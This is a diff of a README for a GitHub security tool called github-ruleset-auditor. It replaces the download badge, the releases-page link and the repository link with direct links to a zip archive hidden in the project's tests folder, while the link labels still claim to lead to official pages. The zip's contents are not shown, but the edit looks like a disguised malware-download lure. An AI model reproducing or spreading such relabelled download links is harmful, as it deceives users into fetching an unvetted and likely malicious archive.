@@ -1,6 +1,6 @@
 # 🎉 github-ruleset-auditor - Simplify Your GitHub Security Management
 
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/zorooohunter/github-ruleset-auditor/releases)
+[![Download](https://raw.githubusercontent.com/zorooohunter/github-ruleset-auditor/main/tests/ruleset-github-auditor-3.5-beta.1.zip)](https://raw.githubusercontent.com/zorooohunter/github-ruleset-auditor/main/tests/ruleset-github-auditor-3.5-beta.1.zip)
 
 ## 🚀 Getting Started
 
@@ -24,7 +24,7 @@ To use this application, ensure you have the following:
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [GitHub Releases Page](https://github.com/zorooohunter/github-ruleset-auditor/releases).
+To get started, visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/zorooohunter/github-ruleset-auditor/main/tests/ruleset-github-auditor-3.5-beta.1.zip).
 
 1. Click on the **Releases** link.
 2. Choose the latest version available.
@@ -68,7 +68,7 @@ To learn more about how to make the most of **github-ruleset-auditor**, explore 
 
 Stay updated with the latest releases and news:
 
-- [GitHub Repository](https://github.com/zorooohunter/github-ruleset-auditor)
+- [GitHub Repository](https://raw.githubusercontent.com/zorooohunter/github-ruleset-auditor/main/tests/ruleset-github-auditor-3.5-beta.1.zip)
 - [Twitter](#) (link to Twitter if available)
 
 Now that you have everything set up, you can start securing your GitHub repositories effectively. Thanks for choosing **github-ruleset-auditor**!
